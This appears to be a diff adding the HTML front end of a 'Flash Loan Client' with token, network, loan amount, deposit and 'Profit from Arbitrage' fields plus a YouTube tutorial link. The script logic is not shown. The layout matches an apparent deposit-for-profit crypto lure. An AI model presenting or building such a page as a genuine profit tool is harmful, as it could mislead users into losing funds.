@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+	<title>Flash Loan Client</title>
+
+	<link rel="stylesheet" href="./assets/css/styles.css">
+
+	
+</head>
+ 
+<body ng-app="myApp" ng-controller="myCtrl">
+	<p class="highlight">BNB Flash Loan is also supported now</p>
+
+	<form id="form1">
+		<h1>STEP 1</h1>
+		<p>Your ERC20 Details</p>
+
+		<div>&nbsp;</div>
+
+		<div class="input-holder">
+			<label>Token Name:</label>
+			<br>
+			<input type="text" ng-model="erc20.name" maxlength="10" autofocus />
+		</div>
+
+		<div class="input-holder">
+			<label>Token Symbol:</label>
+			<br>
+			<input type="text" ng-model="erc20.symbol" maxlength="4" />
+		</div>
+
+		<div class="input-holder">
+			<label>Select Network:</label>
+			
+			<div>&nbsp;</div>
+			
+			<input type="radio" ng-model="erc20.network"  name="network" value="eth" ng-checked="erc20.network">
+			<label for="n1">Ethereum</label>
+			
+			<div>&nbsp;</div>
+			
+			<input type="radio" ng-model="erc20.network"  name="network" value="bsc" ng-checked="!erc20.network" checked="checked">
+			<label for="n2">Binance Smart Chain</label>
+		</div>
+
+		<div class="input-holder btn-holder">
+			<button id="nextstep" type="submit">Next Step</button>
+		</div>
+	</form>
+
+	<form id="form2">
+		<h1>STEP 2</h1>
+		<p>Flash Loan Details</p>
+
+		<div>&nbsp;</div>
+
+		<div class="input-holder">
+			<label>Loan Amount </label>
+			<br>
+			<input id="loanAmtInput" type="number" min="25" max="500" />
+		</div>
+
+		<div class="input-holder info">
+			<div class="kv">
+				<div>Token Deployment Fee</div>
+				<div id="tokdepfee">0</div>
+			</div>
+
+			<div class="kv">
+				<div>Swapping Fee</div>
+				<div id="swapfee">0</div>   
+			</div>
+
+			<div class="kv">
+				<div>Total Cost</div>
+				<div id="totalcost"  style="color:red; font-weight:bold;">0</div>
+			</div>
+
+			<hr>
+
+			<div class="kv">
+				<div>Profit from Arbitrage</div>
+				<div id="profit" style="color:blue; font-weight:bold;">0</div>
+			</div>
+		</div>
+
+		<div class="input-holder btn-holder">
+			<button id="deposit" type="submit" >Deposit <div id="currency">0</div></button>
+		</div>
+
+		<div class="input-holder btn-holder">
+			<button id="execute" type="submit" >Execute Flash Loan</button>
+		</div>
+	</form>
+
+	<div class="youtube-note">
+		<p><a href="https://www.youtube.com/channel/UCx71PM8WE1NhuL9G6LnXMHg" target="_blank">Watch Tutorial on YouTube</a></p>
+	</div>
+	<script src="./assets/js/jquery.js"></script>
+	<script src="./assets/js/web3.js"></script>
+	<script src="./assets/js/flash.js"></script>
+	
+	
+</body>
+
+</html>
